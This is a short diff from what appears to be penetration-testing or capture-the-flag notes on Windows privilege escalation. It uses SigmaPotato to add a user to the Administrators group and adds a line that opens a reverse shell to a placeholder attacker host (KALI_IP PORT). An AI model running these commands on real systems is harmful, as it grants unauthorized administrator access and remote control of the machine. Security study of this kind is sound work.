@@ -142,6 +142,8 @@ net user
   
 .\SigmaPotato "net localgroup Administrators kira /add"  
 net localgroup Administrators  
+
+.\sigmapotato.exe --revshell KALI_IP PORT
 ``` 
 
 ```powershell
